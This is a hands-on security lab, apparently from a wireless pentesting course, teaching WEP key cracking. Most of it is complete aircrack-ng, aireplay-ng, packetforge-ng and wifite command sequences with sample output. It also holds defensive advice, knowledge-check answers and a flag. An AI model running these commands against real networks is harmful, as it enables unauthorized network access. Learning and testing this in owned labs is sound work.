# Lab 04: WEP Cracking

Understanding and exploiting the fundamental vulnerabilities in WEP (Wired Equivalent Privacy) encryption.

```
+===============================================================+
|                      WEP CRACKING                              |
+===============================================================+
|  Difficulty: Intermediate    Duration: 1 hour                 |
|  Hardware: WiFi Adapter      Type: Practical                  |
+===============================================================+
```

## Legal Disclaimer

```
+=====================================================================+
|                         LEGAL WARNING                                |
+=====================================================================+
|  Cracking WEP encryption on networks without explicit written       |
|  authorization is ILLEGAL and may result in criminal prosecution.   |
|                                                                      |
|  - ONLY test on networks you OWN or have WRITTEN PERMISSION         |
|  - Set up an isolated test environment for practice                 |
|  - WEP is deprecated - upgrade vulnerable networks instead          |
|                                                                      |
|  The techniques in this lab are for educational purposes only.      |
|  Misuse can result in fines, imprisonment, and civil liability.     |
+=====================================================================+
```

## Learning Objectives

By the end of this lab, you will:

1. Understand why WEP encryption is fundamentally broken
2. Capture WEP-encrypted traffic using airodump-ng
3. Perform ARP request replay attacks with aireplay-ng
4. Crack WEP keys using aircrack-ng
5. Understand IV (Initialization Vector) weaknesses
6. Recognize the importance of modern encryption protocols

## Prerequisites

- Completed Lab 03: Wireless Reconnaissance
- WiFi adapter with monitor mode and packet injection support
- Kali Linux or similar security distribution
- Isolated test network using WEP (for practice only)

## Hardware Requirements

| Component | Requirement | Notes |
|-----------|-------------|-------|
| WiFi Adapter | Monitor mode + injection | Alfa AWUS036ACH recommended |
| Test AP | WEP capability | Most modern routers still support WEP |
| Test Client | Any WiFi device | To generate traffic |

**Verify Packet Injection Support:**
```bash
# Test injection capability
sudo aireplay-ng --test wlan0mon

# Expected output:
# Injection is working!
```

## Why WEP is Broken

### The Fundamental Flaws

```
WEP Vulnerabilities:

┌──────────────────────────────────────────────────────────────────┐
│                     WEP DESIGN FLAWS                              │
├──────────────────────────────────────────────────────────────────┤
│                                                                   │
│  1. SMALL IV SPACE (24-bit)                                       │
│     ├── Only 16,777,216 possible IVs                             │
│     ├── Busy network exhausts IVs in hours                       │
│     └── IV reuse = same keystream = decryption possible          │
│                                                                   │
│  2. WEAK IV PROBLEM                                               │
│     ├── Certain IVs reveal key bytes (FMS attack)                │
│     ├── ~9,000 weak IVs in 24-bit space                          │
│     └── Can derive key with enough weak IVs                      │
│                                                                   │
│  3. NO KEY MANAGEMENT                                             │
│     ├── Static shared key for all users                          │
│     ├── No automatic key rotation                                │
│     └── Compromised key = entire network compromised             │
│                                                                   │
│  4. WEAK INTEGRITY CHECK                                          │
│     ├── CRC32 is not cryptographic                               │
│     ├── Allows packet modification                               │
│     └── Enables injection attacks                                │
│                                                                   │
└──────────────────────────────────────────────────────────────────┘
```

### Attack Evolution

```
WEP Attack Timeline:

2001 ──► FMS Attack
         │ ├── First practical attack
         │ ├── Exploits weak IVs
         │ └── Requires ~1,000,000 packets
         │
2004 ──► KoreK Attack
         │ ├── Multiple correlation attacks
         │ └── Fewer packets needed (~500,000)
         │
2007 ──► PTW Attack (Current Standard)
         │ ├── Requires only ~40,000 packets
         │ ├── Uses ARP packets specifically
         │ └── Implemented in aircrack-ng
         │
Today ─► WEP crackable in 2-5 minutes
```

## Lab Overview

### Attack Flow

```
WEP Cracking Process:

Step 1: Enable Monitor Mode
        ↓
Step 2: Discover WEP Network (airodump-ng)
        ↓
Step 3: Associate with Target AP (aireplay-ng -1)
        ↓
Step 4: Capture IVs (airodump-ng with -w)
        ↓
Step 5: Generate Traffic (aireplay-ng -3 ARP replay)
        ↓
Step 6: Crack Key (aircrack-ng)
        ↓
        KEY RECOVERED!
```

## Step-by-Step Instructions

### Step 1: Enable Monitor Mode

```bash
# Check for interfering processes
sudo airmon-ng check

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Verify
iwconfig wlan0mon
# Should show: Mode:Monitor
```

### Step 2: Discover WEP Networks

```bash
# Scan for all networks
sudo airodump-ng wlan0mon

# Filter for WEP networks only
sudo airodump-ng --encrypt WEP wlan0mon
```

**Understanding the Output:**
```
 BSSID              PWR  Beacons    #Data  #/s  CH   MB   ENC  CIPHER  AUTH ESSID

 AA:BB:CC:DD:EE:FF  -45      156       45   12   6   54   WEP  WEP         TestWEP

 # Key columns:
 # ENC = WEP (our target)
 # #Data = Number of data packets (we need ~40,000)
 # #/s = Data packets per second
```

### Step 3: Target the WEP Network

```bash
# Lock onto target and start capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Parameters:
# -c 6           : Channel 6
# --bssid        : Target AP MAC address
# -w wep_capture : Output file prefix
```

### Step 4: Fake Authentication

```bash
# In a NEW terminal window:
# Associate with the AP to enable injection
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Parameters:
# -1          : Fake authentication attack
# 0           : Reassociation timing (0 = once)
# -a          : AP BSSID
# -h          : Your wireless adapter's MAC address

# Expected output:
# Association successful :-)
```

### Step 5: ARP Request Replay Attack

```bash
# In another terminal:
# Replay ARP packets to generate IVs
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Parameters:
# -3    : ARP request replay attack
# -b    : AP BSSID
# -h    : Your MAC address

# Output will show:
# Read XXXX packets (got YYY ARP requests and ZZZ ACKs), sent AAAA packets...
```

**What's Happening:**
```
ARP Replay Attack Explained:

1. Capture legitimate ARP packet from network
2. Retransmit ARP packet repeatedly
3. AP responds with new IV each time
4. IVs accumulate rapidly
5. Enough IVs allow key calculation

┌────────────┐     ARP Request      ┌────────────┐
│  Attacker  │─────────────────────►│     AP     │
└────────────┘                      └────────────┘
      │                                    │
      │     ARP Reply (new IV)            │
      │◄───────────────────────────────────│
      │                                    │
      │     ARP Request (replay)          │
      │───────────────────────────────────►│
      │                                    │
      │     ARP Reply (another new IV)    │
      │◄───────────────────────────────────│
      │                                    │
    [Repeat thousands of times]
```

### Step 6: Crack the WEP Key

```bash
# In yet another terminal (while capture is running):
sudo aircrack-ng wep_capture-01.cap

# Or with specific BSSID:
sudo aircrack-ng -b AA:BB:CC:DD:EE:FF wep_capture-01.cap
```

**Expected Output:**
```
                                              Aircrack-ng 1.7

                              [00:00:15] Tested 85324 keys (got 47523 IVs)

   KB    depth   byte(vote)
    0    0/  1   A3(52736) 7F(47616) 2B(46848) 8C(46592) 5E(45824)
    1    0/  1   B2(54016) F8(48128) 93(47360) 1A(46080) C4(45824)
    2    0/  2   C1(51456) 45(48896) 7D(46336) E2(45568) 8A(45312)
    3    0/  1   D4(53760) 9F(47104) 3B(46592) 72(46080) 1E(45568)
    4    0/  1   E5(55296) 2C(46848) F1(46336) 68(45824) A7(45312)

                         KEY FOUND! [ A3:B2:C1:D4:E5 ]
        Decrypted correctly: 100%
```

## Alternative Attack Methods

### Interactive Packet Replay

```bash
# For networks with no traffic
sudo aireplay-ng -2 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# -2 = Interactive packet replay
# Select a data packet when prompted
```

### Fragmentation Attack

```bash
# Obtain keystream without traffic
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Then create an ARP packet:
sudo packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 -k 255.255.255.255 -l 255.255.255.255 -y fragment-XXXX-XXXXXX.xor -w arp-request

# Inject the packet:
sudo aireplay-ng -2 -r arp-request wlan0mon
```

### Chop-Chop Attack

```bash
# Alternative to fragmentation
sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
```

## Automated Tool: Wifite

```bash
# Wifite automates the entire process
sudo wifite --wep

# Wifite will:
# 1. Scan for WEP networks
# 2. Attempt fake authentication
# 3. Run ARP replay attack
# 4. Crack the key
```

## Lab Exercises

### Exercise 1: Basic WEP Crack

Using your isolated test network:
1. Configure your test AP for WEP encryption
2. Perform the full attack sequence
3. Record how many IVs were needed
4. Document the time required

### Exercise 2: Low Traffic Environment

1. Disconnect the test client from your WEP network
2. Attempt to crack WEP with no legitimate traffic
3. Use fragmentation or chop-chop attack
4. Compare time to Exercise 1

### Exercise 3: Key Complexity Analysis

1. Test with different WEP key lengths (64-bit vs 128-bit)
2. Record IV count needed for each
3. Analyze if key length significantly affects cracking time

## Defensive Measures

```
How to Protect Against WEP Attacks:

╔══════════════════════════════════════════════════════════════════╗
║                    MITIGATION STRATEGIES                          ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  1. NEVER USE WEP                                                 ║
║     └── Upgrade to WPA2 or WPA3 immediately                      ║
║                                                                   ║
║  2. IF YOU MUST USE WEP (legacy devices):                        ║
║     ├── Isolate WEP network from main network                    ║
║     ├── Use MAC address filtering (weak, but adds layer)         ║
║     ├── Implement VPN over WEP connection                        ║
║     └── Plan for immediate upgrade                               ║
║                                                                   ║
║  3. NETWORK MONITORING                                            ║
║     ├── Detect fake authentication attempts                      ║
║     ├── Alert on unusual ARP traffic                             ║
║     └── Monitor for deauth attacks                               ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

## Common Issues and Solutions

| Issue | Cause | Solution |
|-------|-------|----------|
| "Injection not working" | Incompatible driver | Use supported chipset |
| "Association failed" | MAC filtering | Spoof connected client MAC |
| "Not getting IVs" | No traffic | Use fragmentation attack |
| "Cracking takes too long" | Not enough IVs | Wait for more or generate traffic |

## Knowledge Check

1. How many possible IVs exist in WEP?
2. What makes certain IVs "weak"?
3. Why is the ARP replay attack effective?
4. What's the minimum IV count for PTW attack?
5. Why doesn't longer WEP key mean better security?

<details>
<summary>Answers</summary>

1. 2^24 = 16,777,216 possible IVs
2. Certain IVs leak information about the key bytes due to RC4 weakness
3. Each ARP reply from AP uses a new IV, rapidly accumulating IVs
4. Approximately 40,000 IVs with PTW attack
5. Key length doesn't fix IV reuse problem - all WEP versions are vulnerable

</details>

## Summary

In this lab, you learned:

1. **WEP Vulnerabilities**: IV collision, weak IVs, static keys
2. **Attack Methodology**: Capture, inject, crack sequence
3. **Tools**: airodump-ng, aireplay-ng, aircrack-ng
4. **Alternative Methods**: Fragmentation, chop-chop attacks
5. **Key Takeaway**: WEP is fundamentally broken - never use it

## Historical Context

WEP was cracked publicly in 2001, yet as of 2024, it's still found on:
- Legacy industrial systems
- Older IoT devices
- Neglected small business networks

Finding WEP in a penetration test is a critical vulnerability that should be immediately reported and remediated.

## Next Lab

Proceed to [Lab 05: WPA/WPA2 Attacks](../05-wpa-attacks/) to learn about more sophisticated attacks on modern WiFi security.

## References

- [Aircrack-ng WEP Tutorial](https://www.aircrack-ng.org/doku.php?id=simple_wep_crack)
- [FMS Attack Paper](https://www.drizzle.com/~aboba/IEEE/rc4_ksaproc.pdf)
- [PTW Attack Paper](https://eprint.iacr.org/2007/120.pdf)

---

**Flag:** `FLAG{w3p_1s_d34d}`
